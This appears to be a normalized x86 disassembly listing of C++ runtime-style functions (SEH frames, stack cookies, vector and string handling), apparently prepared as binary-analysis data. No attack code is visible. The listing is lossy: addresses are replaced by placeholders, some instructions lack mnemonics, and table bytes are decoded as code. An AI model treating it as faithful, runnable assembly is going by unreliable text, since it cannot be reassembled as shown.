push eax
push ecx
add eax 0x14
push eax
call sub_405790
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x4 ]
push edx
lea ecx [ esi + 0xc ]
push ecx
push eax
add eax 0xffffffec
push eax
call sub_405c40
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
add esp 0x20
add [ esi + 0x4 ] 0xffffffec
mov [ eax ] edx
pop esi
pop ebp
retn 0x8
sub_405e60
push ebp
mov ebp esp
mov edx [ ecx + 0x4 ]
push esi
push edi
mov edi [ ecx ]
sub edx edi
mov eax 0x66666667
imul edx
mov eax [ ebp + 0x8 ]
sar edx 0x3
mov esi edx
shr esi 0x1f
add esi edx
mov edx 0xccccccc
sub edx eax
cmp edx esi
jae r-xdata
mov edx [ ecx + 0x8 ]
add esi eax
sub edx edi
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_4194e6
pop edi
pop esi
pop ebp
retn 0x4
mov edx eax
shr edx 0x1
mov edi 0xccccccc
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_405cb0
mov eax esi
cmp eax esi
jae r-xdata
sub_405ee0
push ebp
mov ebp esp
push 0xffffffff
push sub_42d2fb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx ecx
xor ecx ecx
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x6c ] eax
mov [ ebx + 0x4 ] cx
mov [ ebx + 0x8 ] r--data
xor esi esi
mov [ ebx ] r--data
mov [ ebx + 0x8 ] r--data
mov [ ebp - 0x4 ] esi
mov [ ebx + 0x24 ] esi
mov [ ebx + 0x28 ] esi
mov [ ebx + 0x2c ] esi
mov [ ebx + 0x38 ] esi
mov [ ebx + 0x3c ] esi
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x4c ] esi
mov [ ebx + 0x50 ] esi
mov [ ebx + 0x54 ] esi
push 0x18
mov [ ebp - 0x4 ] 0x3
call sub_41ac18
add esp 0x4
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x4 ] 0x4
cmp eax esi
je r-xdata
xor edi edi
push 0xb
push rw-data
push 0x3e
push rw-data
mov ecx eax
call sub_412430
mov edi eax
jmp r-xdata
xor eax eax
mov ecx [ rw-data ]
sub esp 0x10
mov edx esp
mov [ edx ] ecx
mov ecx [ rw-data ]
mov [ edx + 0x4 ] ecx
mov ecx [ rw-data ]
mov [ edx + 0x8 ] ecx
mov ecx [ rw-data ]
mov [ edx + 0xc ] ecx
mov edx [ ebp - 0x64 ]
mov ecx [ ebp - 0x6c ]
push edx
push ecx
mov ecx eax
call sub_418590
jmp r-xdata
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call j_sub_4124d0
push 0x64
mov [ ebp - 0x64 ] eax
call sub_41ac18
add esp 0x4
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x4 ] 0x5
cmp eax esi
je r-xdata
mov eax [ ebx + 0x14 ]
cmp eax esi
je r-xdata
mov ecx edi
call sub_412460
push edi
call sub_41a0d6
add esp 0x4
mov edx [ ebp - 0x64 ]
push edx
mov [ ebp - 0x4 ] 0x3
mov [ ebx + 0x14 ] eax
call sub_41a7eb
add esp 0x4
cmp edi esi
je r-xdata
xor ecx ecx
lea ecx [ eax + 0x4 ]
jmp r-xdata
mov [ ebp - 0x64 ] esi
push 0xb
push rw-data
push 0x32
push rw-data
mov ecx eax
call sub_412430
mov [ ebp - 0x64 ] eax
jmp r-xdata
push 0x18
mov [ ebx + 0x18 ] ecx
mov [ ebx + 0x1c ] eax
call sub_41ac18
add esp 0x4
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x4 ] 0x6
cmp eax esi
je r-xdata
mov ecx 0xc
mov esi eax
lea edi [ ebp - 0x44 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
cmp [ ebp - 0x4c ] edx
jb r-xdata
mov eax [ eax ]
push 0x31
lea eax [ ebp - 0x43 ]
push esi
push eax
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x44 ] 0x0
call sub_41adb0
add esp 0xc
lea ecx [ ebp - 0x60 ]
push ecx
mov ecx [ ebp - 0x64 ]
call sub_412890
mov edx 0x10
cmp [ eax + 0x14 ] edx
jb r-xdata
mov esi [ ebp - 0x64 ]
test esi esi
je r-xdata
mov edx [ ebp - 0x60 ]
push edx
call sub_41a0d6
add esp 0x4
push 0xc
call sub_41ac18
add esp 0x4
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x4 ] 0x7
test eax eax
je r-xdata
mov ecx esi
call sub_412460
push esi
call sub_41a0d6
add esp 0x4
xor eax eax
push 0x32
lea ecx [ ebp - 0x44 ]
push ecx
mov ecx eax
call sub_416820
jmp r-xdata
xor eax eax
lea ecx [ ebx + 0x8 ]
push ecx
mov ecx eax
call sub_4023a0
jmp r-xdata
push 0x3c
mov [ ebp - 0x4 ] 0x3
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x34 ] 0xff
call sub_41ac18
add esp 0x4
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x4 ] 0x8
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_418e50
jmp r-xdata
push 0x8
mov [ ebp - 0x4 ] 0x3
mov [ ebx + 0xc ] eax
call sub_41ac18
add esp 0x4
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x4 ] 0x9
test eax eax
je r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x4
cmp ecx eax
je r-xdata
mov edx [ rw-data ]
mov cx [ rw-data ]
mov edi [ ebx + 0x24 ]
mov [ ebx + 0x5c ] edx
mov [ ebx + 0x20 ] eax
mov eax [ rw-data ]
lea edx [ ebp - 0x6c ]
mov [ ebx + 0x4 ] cx
sub edi edi
push edx
lea ecx [ ebx + 0x24 ]
mov [ ebp - 0x4 ] 0x3
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x64 ] 0x0
mov [ ebp - 0x6c ] ebx
sar edi 0x2
call sub_403740
mov eax [ ebx + 0x28 ]
mov edx [ ebx + 0x24 ]
lea ecx [ eax - 0x4 ]
lea edx [ edx + edi * 4 ]
cmp edx ecx
je r-xdata
push 0x0
push 0x0
push eax
push ecx
push edx
call sub_4033e0
add esp 0x14
sub_4061c0
push ebp
mov ebp esp
push 0xffffffff
push sub_42d349
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x8 ] r--data
mov eax [ esi + 0x20 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_41a0d6
mov ebx [ esi + 0xc ]
xor edi edi
add esp 0x4
cmp ebx edi
je r-xdata
mov ebx [ esi + 0x10 ]
cmp ebx edi
je r-xdata
mov ecx ebx
call sub_402090
push ebx
call sub_41a0d6
add esp 0x4
mov ebx [ esi + 0x14 ]
cmp ebx edi
je r-xdata
mov ecx ebx
call sub_416500
push ebx
call sub_41a0d6
add esp 0x4
mov eax [ esi + 0x4c ]
cmp eax edi
je r-xdata
mov ecx ebx
call sub_416ac0
push ebx
call sub_41a0d6
add esp 0x4
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
mov eax [ esi + 0x38 ]
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
mov ecx [ esi + 0x50 ]
lea edx [ esi + 0x58 ]
push edx
push ecx
push eax
call sub_405c40
mov edx [ esi + 0x4c ]
push edx
call sub_41a0d6
add esp 0x14
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0x40 ] edi
mov eax [ esi + 0x24 ]
cmp eax edi
je r-xdata
push eax
call sub_41a0d6
add esp 0x4
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_41a0d6
add esp 0x4
sub_4062d0
push ebp
mov ebp esp
push 0xffffffff
push sub_42d392
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ edi + 0x4 ]
mov esi [ ebp + 0x8 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov eax [ edi + 0x4 ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
push 0x1
mov ecx edi
call sub_405e60
sub esi eax
mov eax 0x66666667
imul esi
sar edx 0x3
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x14
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov cx [ esi ]
mov [ eax ] cx
mov dl [ esi + 0x2 ]
mov [ eax + 0x2 ] dl
mov cl [ esi + 0x3 ]
add esi 0x4
mov [ eax + 0x3 ] cl
push esi
mov ecx [ edi ]
lea eax [ esi + esi * 4 ]
lea ecx [ ecx + eax * 4 ]
mov eax [ edi + 0x4 ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
push 0x1
mov ecx edi
call sub_405e60
mov dx [ ecx ]
mov [ eax ] dx
movzx edx [ ecx + 0x2 ]
mov [ eax + 0x2 ] dl
movzx edx [ ecx + 0x3 ]
add ecx 0x4
mov [ eax + 0x3 ] dl
push ecx
jmp r-xdata
lea ecx [ eax + 0x4 ]
call sub_402580
sub_4063c0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_4061c0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
add esp 0x4
sub_4063f0
push ebp
mov ebp esp
push 0xffffffff
push sub_42d3c8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov edx [ eax + 0x14 ]
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx edi
call edx
movzx eax [ eax ]
push eax
lea ecx [ ebp - 0x20 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_405a60
mov eax [ ebp - 0x30 ]
xor ecx ecx
mov [ ebp - 0x4 ] 0x2
cmp eax ecx
je r-xdata
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x28 ] ecx
cmp [ ebp - 0x20 ] cx
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x2c ]
lea ecx [ ebp - 0x24 ]
push ecx
push edx
push eax
call sub_402460
mov eax [ ebp - 0x30 ]
push eax
call sub_41a0d6
add esp 0x14
xor ecx ecx
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ esi + 0x4c ]
call sub_4062d0
mov ecx [ esi + 0xc ]
mov edx [ ecx ]
mov eax [ edx + 0xc ]
push edi
call eax
mov cx [ ebp - 0x20 ]
mov dl [ ebp - 0x1e ]
sub esp 0x14
mov eax esp
mov [ eax ] cx
mov cl [ ebp - 0x1d ]
mov [ eax + 0x2 ] dl
lea edx [ ebp - 0x1c ]
mov [ ebp + 0x8 ] esp
mov [ eax + 0x3 ] cl
push edx
lea ecx [ eax + 0x4 ]
call sub_402580
mov ecx [ esi + 0xc ]
mov eax [ ecx ]
mov edx [ eax + 0x14 ]
call edx
mov esi [ ebp - 0x1c ]
test esi esi
je r-xdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x18 ]
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x10 ]
push ecx
push edx
push esi
call sub_402460
push esi
call sub_41a0d6
add esp 0x14
mov edx [ edi ]
mov edx [ edx + 0x14 ]
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
call edx
mov cx [ eax ]
mov dl [ eax + 0x2 ]
mov [ ebp - 0x20 ] cx
mov cl [ eax + 0x3 ]
add eax 0x4
mov [ ebp - 0x1d ] cl
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] dl
call sub_404f40
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
mov cx [ ebp - 0x20 ]
mov dl [ ebp - 0x1e ]
sub esp 0x14
mov eax esp
mov [ eax ] cx
mov cl [ ebp - 0x1d ]
mov [ eax + 0x2 ] dl
lea edx [ ebp - 0x1c ]
mov [ ebp + 0x8 ] esp
mov [ eax + 0x3 ] cl
push edx
lea ecx [ eax + 0x4 ]
call sub_402580
mov ecx esi
call sub_404da0
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x40 ]
lea ecx [ ebp - 0x38 ]
push ecx
push edx
push eax
call sub_402460
mov eax [ ebp - 0x44 ]
push eax
call sub_41a0d6
add esp 0x14
sub_406590
push ebp
mov ebp esp
push 0xffffffff
push sub_42d400
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor edx edx
xor ebx ebx
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0x6 ]
dec ecx
mov [ ebp - 0x4 ] ebx
cmp ecx 0x3c
ja r-xdata
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
movzx ecx [ ecx + lookup_table_4069c0 ]
jmp [ ecx * 4 + jump_table_40698c ]
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov ecx esi
call sub_405220
jmp r-xdata
mov ecx esi
call sub_404380
jmp r-xdata
cmp [ eax + 0xc ] 0x4
jne r-xdata
cmp [ eax + 0xc ] 0x4
jne r-xdata
mov eax [ rw-data ]
push eax
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x14 ] esp
push r--data
call sub_403cc0
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov eax [ esi + 0x5c ]
mov edx [ edx + 0x8 ]
push eax
call edx
mov eax [ rw-data ]
push eax
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x14 ] esp
push r--data
call sub_403cc0
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov eax [ esi + 0x60 ]
mov edx [ edx + 0x8 ]
push eax
call edx
jmp r-xdata
cmp [ eax + 0xc ] 0x2
jne r-xdata
mov ecx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push ecx
push eax
lea edx [ ebp - 0x2c ]
push edx
mov ecx esi
call sub_4057e0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x2c ] bx
jne r-xdata
cmp [ eax + 0xc ] 0x4
jne r-xdata
cmp [ eax + 0xc ] 0x2
jne r-xdata
cmp [ eax + 0xc ] 0x4
jne r-xdata
cmp [ eax + 0xc ] 0x2
jne r-xdata
mov ecx esi
call sub_403480
mov [ esi + 0x64 ] 0x1
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
lea edx [ eax - 0x1 ]
cmp edx 0x2932dfe
ja r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cmp [ esi + 0x60 ] ebx
jbe r-xdata
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov ecx [ esi + 0x50 ]
sub ecx [ esi + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax 0x66666667
imul ecx
sar edx 0x3
mov ecx edx
shr ecx 0x1f
xor edi edi
add ecx edx
je r-xdata
sub esp 0x14
lea edx [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x14 ] esp
push edx
call sub_4026b0
mov ecx [ esi + 0xc ]
mov eax [ ecx ]
mov edx [ eax + 0x14 ]
call edx
mov ecx [ esi + 0x50 ]
sub ecx [ esi + 0x4c ]
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ ebp - 0x24 ]
jne r-xdata
mov eax [ eax + 0x8 ]
mov edi [ eax ]
cmp edi ebx
je r-xdata
mov edx [ esi + 0x28 ]
sub edx [ esi + 0x24 ]
mov eax [ eax + 0x8 ]
movzx ebx [ eax ]
mov edi 0x1
sar edx 0x2
cmp edx edi
jbe r-xdata
mov eax [ eax + 0x8 ]
mov edi [ eax ]
cmp edi ebx
je r-xdata
mov eax [ eax + 0x8 ]
movzx ebx [ eax ]
mov edx [ esi + 0x50 ]
sub edx [ esi + 0x4c ]
lea ecx [ esi + 0x4c ]
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
mov edi 0x1
add eax edx
cmp eax edi
jbe r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov [ esi + 0x5c ] eax
jmp r-xdata
cmp eax [ esi + 0x5c ]
ja r-xdata
lea ecx [ ecx ]
lea ecx [ ebp - 0x2c ]
call sub_4026e0
jmp r-xdata
mov ecx [ esi + 0x4c ]
mov dx [ ebp - 0x2c ]
lea ebx [ ebx + ebx * 4 ]
add ebx ebx
add ebx ebx
cmp [ ebx + ecx ] dx
jne r-xdata
lea ecx [ ebp - 0x2c ]
call sub_4026e0
jmp r-xdata
mov edx [ edi ]
mov eax [ edx + 0xc ]
mov ecx edi
call eax
test ax ax
je r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ eax + edi * 4 ]
mov edx [ ecx ]
mov eax [ edx + 0xc ]
call eax
cmp ax bx
je r-xdata
xor bl bl
mov eax [ edi ]
mov edx [ eax + 0x14 ]
lea ecx [ ebp - 0x40 ]
push ecx
mov ecx edi
call edx
mov edx 0x1
cmp [ eax ] bx
je r-xdata
mov esi [ ecx ]
lea edx [ esi + 0x14 ]
mov [ esi + 0x60 ] eax
jmp r-xdata
mov ecx [ esi + 0x50 ]
sub ecx [ esi + 0x4c ]
mov eax 0x66666667
imul ecx
sar edx 0x3
mov ecx edx
shr ecx 0x1f
inc edi
add ecx edx
add ebx 0x14
cmp edi ecx
jb r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x10 ]
call eax
mov al [ ebp - 0xd ]
mov ecx [ esi + 0x50 ]
sub ecx [ esi + 0x4c ]
inc al
movzx ebx al
mov [ ebp - 0xd ] al
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
sub esp 0x14
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x14 ] esp
push eax
call sub_4026b0
mov ecx esi
call sub_404da0
mov eax [ esi + 0x4c ]
add eax ebx
push eax
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ esi + 0x4c ]
call sub_405e10
lea edx [ ebp - 0x2c ]
push edx
lea ecx [ esi + 0x4c ]
call sub_4062d0
lea ecx [ ebp - 0x14 ]
push ecx
lea ecx [ esi + 0x24 ]
mov [ ebp - 0x14 ] edi
call sub_4039d0
jmp r-xdata
mov eax [ esi + 0x24 ]
lea edi [ eax + edi * 4 ]
push edi
lea edx [ ebp - 0x18 ]
push edx
lea ecx [ esi + 0x24 ]
call sub_403220
jmp r-xdata
mov ecx [ esi + 0x28 ]
sub ecx [ esi + 0x24 ]
inc edi
sar ecx 0x2
cmp edi ecx
jb r-xdata
test bl bl
je r-xdata
lea ecx [ ebp - 0x40 ]
call sub_4026e0
mov bl dl
jmp r-xdata
lea eax [ edi + edi * 4 ]
lea eax [ esi + eax * 4 ]
push eax
lea edx [ ebp - 0x18 ]
push edx
call sub_405e10
jmp r-xdata
inc edi
add edx 0x14
cmp edi eax
jb r-xdata
mov edx [ esi + 0x4c ]
mov eax [ ebp - 0x14 ]
cmp [ ebx + edx ] ax
jne r-xdata
jmp r-xdata
jmp r-xdata
push edi
mov ecx esi
call sub_4063f0
jmp r-xdata
test dl 0x1
je r-xdata
cmp [ edx ] bx
je r-xdata
jmp r-xdata
sub_4069cd
or al 0xc
or al 0xc
or al 0xc
or al 0xc
or al 0xc
or al 0xc
or al 0xc
or al 0xc
or al 0x2
add eax [ esp + ecx ]
or al 0xc
or al 0xc
or al 0xc
add eax 0xc0c0c06
or al 0xc
or al 0xc
or al 0x7
or [ ecx ] cl
or cl [ esp + ecx ]
or al 0xc
or al 0xc
or ecx esp
int3
sub_406a00
push ebp
mov ebp esp
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp eax esi
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax esi
cmp eax edi
jae r-xdata
push r--data
call sub_419533
mov ebx [ ebp + 0x14 ]
mov edx edi
cmp edi ebx
jb r-xdata
mov edi eax
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov edx ebx
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
cmp edi ebx
jae r-xdata
mov si [ eax ]
cmp si [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x10 ]
lea eax [ eax + esi * 2 ]
test edx edx
je r-xdata
xor eax eax
cmp edi ebx
setne al
pop edi
pop esi
or eax 0xffffffff
pop ebx
pop ebp
retn 0x10
movzx eax [ eax ]
cmp ax [ ecx ]
sbb eax eax
and eax 0xfffffffe
inc eax
jne r-xdata
add eax 0x2
add ecx 0x2
dec edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
jmp r-xdata
sub_406a90
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov edi [ ebp + 0x10 ]
mov ebx ecx
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] ebx
test edi edi
jne r-xdata
push esi
cmp edi eax
ja r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx eax
jae r-xdata
or eax 0xffffffff
pop esi
mov ecx [ ebp + 0xc ]
sub eax edi
cmp ecx eax
jae r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0xc
pop edi
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov eax ecx
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov ecx ebx
call sub_401180
cmp esi eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
test edi edi
je r-xdata
lea esi [ ecx + eax * 2 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
mov [ ebp + 0xc ] ecx
sub esi 0x2
jmp r-xdata
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
lea ebx [ ebx ]
mov dx [ ebp + 0xc ]
cmp [ esi ] dx
jne r-xdata
mov eax esi
mov ecx ebx
pop esi
sub eax ecx
pop edi
sar eax 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebx ]
mov eax esi
pop esi
sub eax ecx
pop edi
sar eax 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
sbb ecx ecx
and ecx 0xfffffffe
inc ecx
je r-xdata
add eax 0x2
add ecx 0x2
dec edx
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
mov bx [ eax ]
cmp bx [ ecx ]
jne r-xdata
sub_406b70
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0xffffffff
ja r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_419f97
push r--data
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0xc ] r--data
call sub_41ac98
push ecx
call sub_41ac18
add esp 0x4
test eax eax
jne r-xdata
sub_406bc0
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
cmp eax ecx
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_419533
test edi edi
je r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x10
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
mov ecx esi
mov [ ecx + eax ] 0x0
mov ecx [ esi ]
mov [ ecx + eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub eax edi
add ebx ecx
push eax
add ebx edi
add edx ecx
push ebx
push edx
call sub_41a460
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_406c50
push ebp
mov ebp esp
push 0xffffffff
push sub_42d420
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
mov esi eax
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0xfffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov [ ebp + 0x8 ] eax
jmp r-xdata
cmp ecx 0xffffffff
ja r-xdata
mov esi 0xfffffffe
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x18 ] 0x0
call sub_419f97
push r--data
lea edx [ ebp - 0x28 ]
push edx
mov [ ebp - 0x28 ] r--data
call sub_41ac98
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
add ecx 0x18
mov [ ebp - 0x4 ] 0x2
call sub_406b70
mov [ ebp + 0x8 ] eax
mov eax r-xdata
retn
push ecx
call sub_41ac18
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x0
mov [ edi ] eax
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ebx
cmp esi 0x10
jb r-xdata
mov ecx [ edi ]
push ecx
call sub_41a0d6
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov [ edi + ebx ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edi eax
push ebx
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_41a0f0
add esp 0xc
sub_406d8b
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_41ac98
int3
mov edx [ esi ]
push edx
call sub_41a0d6
add esp 0x4
sub_406dc0
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax edx
push esi
lea esi [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax esi
sar eax 0x1
push eax
mov eax [ ecx + 0x10 ]
push edx
push eax
push 0x0
call sub_406a00
neg eax
sbb eax eax
inc eax
pop esi
pop ebp
retn
sub_406e00
push ebp
mov ebp esp
